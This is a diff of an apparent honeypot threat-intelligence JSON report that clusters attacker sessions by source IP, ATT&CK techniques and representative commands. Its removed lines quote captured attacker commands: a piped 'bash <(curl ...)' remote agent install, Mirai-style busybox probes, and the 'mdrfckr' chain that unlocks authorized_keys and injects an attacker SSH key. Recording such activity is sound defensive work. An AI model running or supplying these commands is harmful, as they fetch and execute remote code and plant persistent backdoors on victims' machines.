@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-08-11T01:58:46.210040+00:00",
+  "generated_at": "2026-08-11T03:51:33.946908+00:00",
   "total_sessions_with_commands": 11,
   "total_clusters": 4,
-  "campaign_clusters": 3,
+  "campaign_clusters": 1,
   "singleton_clusters": 3,
-  "highest_severity": "HIGH",
+  "highest_severity": "MEDIUM",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
@@ -17,32 +17,6 @@
         "T1592",
         "T1078",
         "T1083"
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "name": "Mirai/IoT Botnet",
-      "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1082",
-        "T1105",
-        "T1059.004"
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
-      "name": "mdrfckr SSH Key Injection",
-      "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1021.004",
-        "T1078",
-        "T1070",
-        "T1140",
-        "T1105"
       ]
     }
   ],
@@ -116,68 +90,68 @@
       ],
       "members": [
         {
-          "session_id": "IR-903846fd4c4c",
+          "session_id": "IR-c841380c3a92",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:35:05.387776Z"
+          "timestamp": "2026-08-11T01:00:43.293536Z"
         },
         {
-          "session_id": "IR-4878aac02e0f",
+          "session_id": "IR-54923c4b2063",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:37:45.621644Z"
+          "timestamp": "2026-08-11T01:03:14.052094Z"
         },
         {
-          "session_id": "IR-252a6a9c3ebb",
+          "session_id": "IR-ed3328ebe13d",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:40:38.761019Z"
+          "timestamp": "2026-08-11T01:06:13.814854Z"
         },
         {
-          "session_id": "IR-ec5b54fabdb9",
+          "session_id": "IR-5ea1e2179376",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:43:13.637583Z"
+          "timestamp": "2026-08-11T01:10:55.685624Z"
         },
         {
-          "session_id": "IR-ae31a3192809",
+          "session_id": "IR-5e49ea28c1f1",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:45:43.827378Z"
+          "timestamp": "2026-08-11T01:22:44.208209Z"
         },
         {
-          "session_id": "IR-0d79a47b6f0f",
+          "session_id": "IR-8e62138a77e9",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:50:08.317838Z"
+          "timestamp": "2026-08-11T01:29:37.773949Z"
         },
         {
-          "session_id": "IR-5daba228847f",
+          "session_id": "IR-d76f8da9edbe",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:52:18.577226Z"
+          "timestamp": "2026-08-11T01:38:26.916393Z"
         },
         {
-          "session_id": "IR-b0f35691dc88",
+          "session_id": "IR-ef0317d6f719",
           "src_ip": "92.118.39.71",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-11T00:54:18.613169Z"
+          "timestamp": "2026-08-11T01:45:41.898689Z"
         }
       ]
     },
@@ -190,151 +164,84 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "152.67.96.249"
+        "130.211.76.1"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
+      "sequence_hash": "6c2b02475f4c7e7e",
+      "ttps": [],
       "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip"
       ],
       "members": [
         {
-          "session_id": "IR-452bd88a46b5",
-          "src_ip": "152.67.96.249",
-          "country": "AU",
-          "isp": "Oracle Public Cloud",
-          "command_count": 7,
-          "timestamp": "2026-08-11T00:08:11.816859Z"
+          "session_id": "IR-b5a9fb8385b8",
+          "src_ip": "130.211.76.1",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-11T02:49:29.901418Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-003",
-      "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-      "matched_campaigns": [
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 2,
-          "pattern_total": 3
-        }
-      ],
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "94.154.43.144"
+        "182.92.204.91"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "247e5eacc7fee14d",
+      "sequence_hash": "6fa4c8ac58e7a1d9",
       "ttps": [
         {
           "id": "T1082",
           "name": "System Information Discovery"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        },
-        {
-          "id": "T1059.004",
-          "name": "T1059.004"
         }
       ],
       "representative_commands": [
-        "echo SHELL_TEST",
-        "/bin/busybox TEST",
-        "cat /proc",
-        "./"
+        "uname -s -m"
       ],
       "members": [
         {
-          "session_id": "IR-09c1a43fdd13",
-          "src_ip": "94.154.43.144",
-          "country": "TR",
-          "isp": "Storm Industries LLC",
-          "command_count": 4,
-          "timestamp": "2026-08-11T00:26:16.867390Z"
+          "session_id": "IR-de4d4c340582",
+          "src_ip": "182.92.204.91",
+          "country": "CN",
+          "isp": "Aliyun Computing Co., LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-11T02:18:28.749057Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-004",
-      "is_campaign": true,
-      "campaign_name": "mdrfckr SSH Key Injection",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-      "matched_campaigns": [
-        {
-          "name": "mdrfckr SSH Key Injection",
-          "ttps": [
-            "T1021.004",
-            "T1078",
-            "T1105"
-          ],
-          "severity": "HIGH",
-          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "130.12.180.51"
+        "130.211.76.1"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "560104d0f634867a",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        },
-        {
-          "id": "T1078",
-          "name": "Valid Accounts"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        }
-      ],
+      "sequence_hash": "758d61f26a444483",
+      "ttps": [],
       "representative_commands": [
-        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h"
+        "PING"
       ],
       "members": [
         {
-          "session_id": "IR-d975958f0486",
-          "src_ip": "130.12.180.51",
-          "country": "DE",
-          "isp": "Virtualine Technologies",
+          "session_id": "IR-243732286739",
+          "src_ip": "130.211.76.1",
+          "country": "BE",
+          "isp": "Google LLC",
           "command_count": 1,
-          "timestamp": "2026-08-11T00:05:29.682708Z"
+          "timestamp": "2026-08-11T02:49:38.515997Z"
         }
       ]
     }
